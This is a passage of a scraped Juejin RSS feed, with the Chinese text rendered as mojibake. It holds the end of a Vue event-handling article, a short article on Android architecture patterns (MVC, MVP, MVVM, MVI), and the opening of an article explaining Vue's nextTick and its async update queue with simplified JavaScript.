<p>è®°ä½ï¼Œ<strong>æ²¡æœ‰ç»å¯¹çš„æœ€ä½³æ–¹å¼ï¼Œåªæœ‰æœ€é€‚åˆå½“å‰åœºæ™¯çš„æ–¹å¼</strong>ã€‚å…³é”®æ˜¯ä¿æŒä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p>
<p>å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸®åŠ©ä½ æ›´å¥½åœ°ä½¿ç”¨ Vue çš„äº‹ä»¶å¤„ç†æœºåˆ¶ï¼å¦‚æœæœ‰æ›´å¤šé—®é¢˜æˆ–æŠ€å·§åˆ†äº«ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºè®¨è®ºã€‚</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android è®¾è®¡æ¶æ„æ¼”è¿›å†ç¨‹]]></title>    <link>https://juejin.cn/post/7595088396440092722</link>    <guid>https://juejin.cn/post/7595088396440092722</guid>    <pubDate>2026-01-14T13:38:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595088396440092722" data-draft-id="7594822511437316122" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android è®¾è®¡æ¶æ„æ¼”è¿›å†ç¨‹"/> <meta itemprop="keywords" content="Android,Android Jetpack"/> <meta itemprop="datePublished" content="2026-01-14T13:38:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jony_"/> <meta itemprop="url" content="https://juejin.cn/user/3403743732709767"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android è®¾è®¡æ¶æ„æ¼”è¿›å†ç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3403743732709767/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jony_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T13:38:55.000Z" title="Wed Jan 14 2026 13:38:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>Android è®¾è®¡æ¶æ„çš„æ¼”è¿›å†ç¨‹ï¼š
MVC -&gt; MVP -&gt; MVVM -&gt; MVI</p>
<p>åœ¨æ¼”è¿›çš„è¿‡ç¨‹ä¸­å…·å¤‡å¦‚ä¸‹ç‰¹å¾ï¼š</p>
<ol>
<li>é™ä½ä¸šåŠ¡é€»è¾‘ä¸ UI å±‚çš„è€¦åˆ</li>
<li>æ•°æ®é©±åŠ¨</li>
<li>å•é¡¹æ•°æ®æµ</li>
</ol>
<h2 data-id="heading-1">ä¸€ã€MVC</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d26d44d8b64747b6b301a2f794af9984~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9ueV8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769002735&amp;x-signature=f%2BY4IKwtZEaCJ7YxyEYerEbsPPQ%3D" alt="image.png" loading="lazy"/></p>
<ol>
<li>Mï¼šModel å±‚ï¼Œé€šå¸¸è´Ÿè´£å‘èµ·ç½‘ç»œè¯·æ±‚ï¼Œæ•°æ®å¤„ç†</li>
<li>Vï¼šView å±‚ï¼ŒæŒ‡ Activity/Fragment ç­‰</li>
<li>Cï¼šController å±‚ï¼Œå¤„ç†ä¸šåŠ¡é€»è¾‘ï¼Œç”¨æˆ·è¡Œä¸ºï¼Œé€šå¸¸æ¥è¯´ï¼Œè¿™ä¸€å±‚çš„æ‰§è¡Œçš„é€»è¾‘ä¹Ÿæ˜¯æ”¾åœ¨äº†Activity/Fragment ä¸­ï¼Œå¯¼è‡´ UI å±‚è€¦åˆä¸¥é‡</li>
</ol>
<p>Model å’Œ Controller ç›¸äº’æŒæœ‰ï¼ŒController å±‚è´Ÿè´£æ¥æ”¶ç”¨æˆ·çš„è¡Œä¸ºï¼ŒModel å¤„ç†ç½‘ç»œæ•°æ®ï¼Œå®Œæˆä¹‹åï¼Œé€šè¿‡ Callback æ›´æ–° UIã€‚</p>
<h2 data-id="heading-2">äºŒã€MVP</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7d37dad035b4de098379aa383e55c0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9ueV8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769002735&amp;x-signature=qRWcYMIEJdJgYYNYHKXsrUtAL6g%3D" alt="image.png" loading="lazy"/></p>
<ol>
<li>Mï¼šModel å±‚ï¼Œé€šå¸¸è´Ÿè´£å‘èµ·ç½‘ç»œè¯·æ±‚ï¼Œæ•°æ®å¤„ç†</li>
<li>Vï¼šView å±‚ï¼ŒæŒ‡ Activity/Fragment ç­‰</li>
<li>Cï¼šPresenter å±‚ï¼Œè´Ÿè´£å¤„ç†ç”¨æˆ·å‘èµ·çš„è¡Œä¸ºï¼Œè¿™é‡Œçš„é€»è¾‘ä¸å†å†™åœ¨ Activity/Fragment ä¸­</li>
</ol>
<p>å’Œ MVC çš„åŒºåˆ«æ˜¯ï¼Œè¿™é‡Œçš„ä¸šåŠ¡é€»è¾‘ä¸å†å†™åœ¨Activity/Fragmentä¸­ï¼Œå¦å¤– View å±‚æ‰€ä¾èµ–çš„ä¸å†æ˜¯æŸä¸ªå…·ä½“çš„ Presenter å®ä¾‹ï¼Œè€Œæ˜¯ Presenter æŠ½è±¡æ¥å£ã€‚</p>
<p>ç›¸å¯¹äº MVCï¼ŒMVP æŠŠç¹é‡çš„ä¸šåŠ¡é€»è¾‘ä» View å±‚æŠ½ç¦»å‡ºå»äº†ï¼ŒåŒæ—¶è§£å†³äº† View å±‚å’Œ Model å±‚çš„ç›´æ¥ä¾èµ–ã€‚ä½†æ˜¯ç”±äº View ä¾èµ–äº† Presenter çš„å¤§é‡æ¥å£ï¼Œä¼šé€ æˆåç»­æ¥å£å†—ä½™ï¼Œå¤§é‡æœªä½¿ç”¨åˆ°çš„æ¥å£ä¹Ÿéœ€è¦å®ç°ã€‚</p>
<ol>
<li>ä¸ºä»€ä¹ˆæ˜¯ä¾èµ– Presenter æ¥å£ï¼Ÿ</li>
</ol>
<p>ä¾èµ–æŠ½è±¡ï¼Œç¬¦åˆè®¾è®¡æ¨¡å¼çš„è¦æ±‚ï¼Œåœ¨åç»­çš„æ‰©å±•ä¸­ï¼Œå¦‚æœ View å±‚çš„ Presenter å‘ç”Ÿå˜åŠ¨ï¼Œä¸éœ€è¦ä¿®æ”¹ View å±‚åŸæœ‰çš„é€»è¾‘ã€‚</p>
<ol start="3">
<li>ä¸ºä»€ä¹ˆä¼šå‡ºç°æ¥å£å†—ä½™ï¼Ÿ</li>
</ol>
<p>ç°å‡è®¾ï¼ŒPresenterV1 å’Œ PresenterV2 éƒ½å®ç°äº† IPresenterï¼Œåœ¨ V2 æ”¹ç‰ˆä¸­æ–°å¢çš„äº†ä¸€ä¸ªæ¥å£æ–¹æ³•ï¼ŒåŸæ¥çš„ V1 ç‰ˆæœ¬æ˜¯ä¸æ˜¯ä¹Ÿå¾—å®ç°ï¼Ÿæˆ–è€…æ˜¯ï¼Œåœ¨ V2 ç‰ˆæœ¬çš„ä¸­ï¼Œå·²ç»æ²¡æœ‰ V1 ä¸­çš„æŸä¸ªé€»è¾‘äº†ï¼Œä½†æ˜¯ç”±äºå®ç°äº† IPresenterï¼Œåœ¨ V2 ç‰ˆæœ¬ä¸­å°±ä¸å¾—ä¸å®ç°ã€‚</p>
<h2 data-id="heading-3">ä¸‰ã€MVVM</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/600d92d8a35c408d93977ba2baccdadb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9ueV8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769002735&amp;x-signature=d9T4kWYuASwC6LHbzNCMkltUoQ8%3D" alt="image.png" loading="lazy"/></p>
<ol>
<li>Mï¼šModel å±‚ï¼Œé€šå¸¸è´Ÿè´£å‘èµ·ç½‘ç»œè¯·æ±‚ï¼Œæ•°æ®å¤„ç†</li>
<li>Vï¼šView å±‚ï¼ŒæŒ‡ Activity/Fragment ç­‰</li>
<li>VMï¼šViewModel å±‚ï¼Œå“åº”ç”¨æˆ·è¡Œä¸ºï¼Œé€šè¿‡è§‚å¯Ÿè€…æ¨¡å¼æ›´æ–° UI</li>
</ol>
<p>å½»åº•è§£è€¦äº† View å±‚å’Œé€»è¾‘å±‚çš„åŒå‘æŒæœ‰é—®é¢˜ï¼Œé™ä½äº†å†…å­˜æ³„æ¼çš„æœºç‡ï¼ŒViewModel å±‚ä¸å†æŒæœ‰ UI å±‚ï¼Œè€Œæ˜¯é€šè¿‡ LiveData è‡ªåŠ¨é€šçŸ¥ UI è‡ªåŠ¨æ›´æ–°ã€‚å®ƒæœ€å¤§çš„ç‰¹ç‚¹ä¾¿æ˜¯æ•°æ®é©±åŠ¨ã€‚</p>
<h2 data-id="heading-4">å››ã€MVI</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c53bc12dc18412eaef3dc59c8e7f411~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9ueV8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769002735&amp;x-signature=FnjZ5STos%2FxfRGRB5MKC6MMK1jE%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨ MVI çš„è®¾è®¡æ¶æ„ä¸­ï¼Œ</p>
<ol>
<li>Vï¼šActivity/ Fragment</li>
<li>Iï¼šæŒ‡Intentï¼ŒView é€šè¿‡ Intent å’Œ ViewModel äº¤äº’ï¼ŒViewModel æŒæœ‰ Domain Layerï¼ˆéå¿…é¡»ï¼‰ï¼Œåè€…æŒæœ‰ Data Layerï¼ˆModel å±‚ï¼‰</li>
<li>Mï¼šæŒ‡ Data Layerï¼Œæ•°æ®å±‚</li>
</ol>
<p>MVI æ¶æ„å…·æœ‰çš„ç‰¹ç‚¹æ˜¯ï¼šå•é¡¹æ•°æ®æµã€Intent é©±åŠ¨</p>
<p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><a href="https://juejin.cn/post/7496335490577825855" target="_blank" title="https://juejin.cn/post/7496335490577825855">1. ã€Œæ¶æ„ç¯‡ 1ã€è®¤è¯† MVC / MVP / MVVM / MVI</a></p>
<p><a href="https://juejin.cn/post/7496345177129582646" target="_blank" title="https://juejin.cn/post/7496345177129582646">2. ã€Œæ¶æ„ç¯‡ 2ã€è®¤è¯† MVC / MVP / MVVM / MVI</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue çš„ nextTickï¼šç ´è§£å¼‚æ­¥æ›´æ–°çš„ç„æœº]]></title>    <link>https://juejin.cn/post/7595034434976350246</link>    <guid>https://juejin.cn/post/7595034434976350246</guid>    <pubDate>2026-01-14T13:42:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595034434976350246" data-draft-id="7595088396440141874" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue çš„ nextTickï¼šç ´è§£å¼‚æ­¥æ›´æ–°çš„ç„æœº"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-14T13:42:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŒ—è¾°alk"/> <meta itemprop="url" content="https://juejin.cn/user/1772855673241352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue çš„ nextTickï¼šç ´è§£å¼‚æ­¥æ›´æ–°çš„ç„æœº
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1772855673241352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŒ—è¾°alk
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T13:42:29.000Z" title="Wed Jan 14 2026 13:42:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€å…ˆçœ‹ç°è±¡ï¼šä¸ºä»€ä¹ˆæ•°æ®å˜äº†ï¼ŒDOM å´æ²¡æ›´æ–°ï¼Ÿ</h2>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;div ref="message"&gt;{{ msg }}&lt;/div&gt;
    &lt;button @click="changeMessage"&gt;ç‚¹å‡»æˆ‘&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  data() {
    return { msg: 'åˆå§‹æ¶ˆæ¯' }
  },
  methods: {
    changeMessage() {
      this.msg = 'æ–°æ¶ˆæ¯'
      console.log('æ•°æ®å·²æ›´æ–°:', this.msg)
      console.log('DOMå†…å®¹:', this.$refs.message?.textContent) // è¿˜æ˜¯'åˆå§‹æ¶ˆæ¯'ï¼
    }
  }
}
&lt;/script&gt;
</code></pre>
<p><strong>æ‰§è¡Œç»“æœï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">æ•°æ®å·²æ›´æ–°: æ–°æ¶ˆæ¯</span>
<span class="hljs-section">DOMå†…å®¹: åˆå§‹æ¶ˆæ¯  â† é—®é¢˜åœ¨è¿™é‡Œï¼</span>
</code></pre>
<p>æ•°æ®æ˜æ˜å·²ç»æ”¹äº†ï¼Œä¸ºä»€ä¹ˆ DOM è¿˜æ˜¯æ—§å€¼ï¼Ÿè¿™å°±æ˜¯ <code>nextTick</code> è¦è§£å†³çš„é—®é¢˜ã€‚</p>
<h2 data-id="heading-1">äºŒã€æ ¸å¿ƒåŸç†ï¼šVue çš„å¼‚æ­¥æ›´æ–°é˜Ÿåˆ—</h2>
<p>Vue çš„ DOM æ›´æ–°æ˜¯<strong>å¼‚æ­¥</strong>çš„ã€‚å½“ä½ ä¿®æ”¹æ•°æ®æ—¶ï¼ŒVue ä¸ä¼šç«‹å³æ›´æ–° DOMï¼Œè€Œæ˜¯ï¼š</p>
<ol>
<li><strong>å¼€å¯ä¸€ä¸ªé˜Ÿåˆ—</strong>ï¼Œç¼“å†²åŒä¸€äº‹ä»¶å¾ªç¯ä¸­çš„æ‰€æœ‰æ•°æ®å˜æ›´</li>
<li><strong>ç§»é™¤é‡å¤çš„ watcher</strong>ï¼Œé¿å…ä¸å¿…è¦çš„è®¡ç®—</li>
<li><strong>ä¸‹ä¸€ä¸ªäº‹ä»¶å¾ªç¯</strong>ä¸­ï¼Œåˆ·æ–°é˜Ÿåˆ—å¹¶æ‰§è¡Œå®é™… DOM æ›´æ–°</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vue å†…éƒ¨çš„ç®€åŒ–é€»è¾‘</span>
<span class="hljs-keyword">let</span> queue = []
<span class="hljs-keyword">let</span> waiting = <span class="hljs-literal">false</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">queueWatcher</span>(<span class="hljs-params">watcher</span>) {
  <span class="hljs-comment">// 1. å»é‡</span>
  <span class="hljs-keyword">if</span> (!queue.<span class="hljs-title function_">includes</span>(watcher)) {
    queue.<span class="hljs-title function_">push</span>(watcher)
  }
  
  <span class="hljs-comment">// 2. å¼‚æ­¥æ‰§è¡Œ</span>
  <span class="hljs-keyword">if</span> (!waiting) {
    waiting = <span class="hljs-literal">true</span>
    <span class="hljs-title function_">nextTick</span>(flushQueue)
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">flushQueue</span>(<span class="hljs-params"/>) {
  queue.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">watcher</span> =&gt;</span> watcher.<span class="hljs-title function_">run</span>())
  queue = []
  waiting = <span class="hljs-literal">false</span>
}
</code></pre>
<h2 data-id="heading-2">ä¸‰ã€nextTick çš„æœ¬è´¨ï¼šå¾®ä»»åŠ¡è°ƒåº¦å™¨</h2>
<p><code>nextTick</code> çš„æ ¸å¿ƒä»»åŠ¡ï¼š<strong>åœ¨ DOM æ›´æ–°å®Œæˆåæ‰§è¡Œå›è°ƒ</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vue 2.x ä¸­çš„ nextTick å®ç°ï¼ˆç®€åŒ–ç‰ˆï¼‰</span>
<span class="hljs-keyword">let</span> callbacks = []
<span class="hljs-keyword">let</span> pending = <span class="hljs-literal">false</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">nextTick</span>(<span class="hljs-params">cb</span>) {
  callbacks.<span class="hljs-title function_">push</span>(cb)
  
  <span class="hljs-keyword">if</span> (!pending) {
    pending = <span class="hljs-literal">true</span>
    
    <span class="hljs-comment">// ä¼˜å…ˆçº§ï¼šPromise &gt; MutationObserver &gt; setImmediate &gt; setTimeout</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Promise</span> !== <span class="hljs-string">'undefined'</span>) {
      <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(flushCallbacks)
